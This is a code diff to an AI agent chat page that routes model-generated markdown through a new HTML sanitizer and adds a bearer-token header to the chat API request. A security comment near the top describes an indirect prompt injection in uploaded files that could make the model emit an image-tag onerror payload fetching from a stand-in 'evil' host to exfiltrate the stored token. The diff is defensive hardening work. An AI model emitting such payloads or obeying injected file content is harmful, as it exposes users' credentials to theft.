@@ -35,7 +35,53 @@
         setTimeout(() => selectAgent(ag), 300);
       }
     });
-            
+
+</script>
+ <script>
+ // SECURITY (F-06): AI/agent output is rendered into innerHTML via
+ // marked.parse(). marked does NOT strip raw HTML, so an indirect prompt
+ // injection (e.g. from uploaded file content) could make the model emit
+ // <img src=x onerror="fetch('//evil/'+localStorage.basira_token)"> and
+ // exfiltrate the stored bearer token from inside the WebView. This
+ // self-contained sanitizer (no CDN dependency) removes dangerous elements,
+ // all on* event-handler attributes, and javascript: URLs from the parsed
+ // HTML before it is inserted. Render AI markdown via renderSafeMarkdown().
+ (function () {
+   var BANNED_TAGS = ['SCRIPT','IFRAME','OBJECT','EMBED','LINK','META','BASE','FORM','STYLE','SVG','MATH'];
+   function sanitizeNode(root) {
+     var walker = document.createTreeWalker(root, NodeFilter.SHOW_ELEMENT, null);
+     var toRemove = [];
+     var node = walker.nextNode();
+     while (node) {
+       if (BANNED_TAGS.indexOf(node.tagName) !== -1) {
+         toRemove.push(node);
+       } else {
+         for (var i = node.attributes.length - 1; i >= 0; i--) {
+           var attr = node.attributes[i];
+           var name = attr.name.toLowerCase();
+           var val = (attr.value || '').replace(/\s+/g, '').toLowerCase();
+           if (name.indexOf('on') === 0) {
+             node.removeAttribute(attr.name);
+           } else if ((name === 'href' || name === 'src' || name === 'xlink:href') &&
+                      (val.indexOf('javascript:') === 0 || val.indexOf('data:text/html') === 0)) {
+             node.removeAttribute(attr.name);
+           }
+         }
+       }
+       node = walker.nextNode();
+     }
+     toRemove.forEach(function (n) { if (n.parentNode) n.parentNode.removeChild(n); });
+   }
+   window.renderSafeMarkdown = function (text) {
+     var html;
+     try { html = marked.parse(text || ''); }
+     catch (e) { return document.createTextNode(text || '').textContent; }
+     var tpl = document.createElement('div');
+     tpl.innerHTML = html;
+     sanitizeNode(tpl);
+     return tpl.innerHTML;
+   };
+ })();
 </script>
  <script src="https://cdn.jsdelivr.net/npm/chart.js">
     // Auto-select agent from URL query param
@@ -662,7 +708,7 @@
    displayReply = displayReply.replace(/\[\[COMMITTEE_DONE\]\]/g, '').trim();
    displayReply = displayReply.replace(/\[\[AGENT_END:.*?\]\]/g, '').trim();
    try {
-     row.querySelector('.msg-bubble').innerHTML = marked.parse(displayReply);
+     row.querySelector('.msg-bubble').innerHTML = renderSafeMarkdown(displayReply);
    } catch(e) {
      row.querySelector('.msg-bubble').textContent = displayReply;
    }
@@ -684,7 +730,7 @@
    if (typingRow) {
     typingRow.innerHTML = '<img class="msg-avatar" src="images/logo-cropped.png" alt=""><div class="msg-bubble"></div>';
     try {
-     typingRow.querySelector('.msg-bubble').innerHTML = marked.parse(text);
+     typingRow.querySelector('.msg-bubble').innerHTML = renderSafeMarkdown(text);
     } catch(e) {
      typingRow.querySelector('.msg-bubble').textContent = text;
     }
@@ -705,9 +751,12 @@
    var currentLang = getAppLanguage();
 
    try {
-    var response = await fetch('http://localhost:8000/api/insights/chat', {
+    var response = await fetch('http://127.0.0.1:8000/api/insights/chat', {
      method: 'POST',
-     headers: { 'Content-Type': 'application/json' },
+     headers: {
+      'Content-Type': 'application/json',
+      'Authorization': 'Bearer ' + (localStorage.getItem('basira_token') || '')
+     },
      body: JSON.stringify({
       messages: chatHistory,
       fileContext: attachedFileContent || (attachedFile ? '[Attached: ' + attachedFile.name + ']' : ''),
@@ -757,7 +806,7 @@
           displayReply = displayReply.replace(/\[\[COMMITTEE_DONE\]\]/g, '').trim();
           displayReply = displayReply.replace(/\[\[AGENT_END:.*?\]\]/g, '').trim();
           try {
-           bubble.innerHTML = marked.parse(displayReply);
+           bubble.innerHTML = renderSafeMarkdown(displayReply);
           } catch(e) {
            bubble.textContent = displayReply;
           }
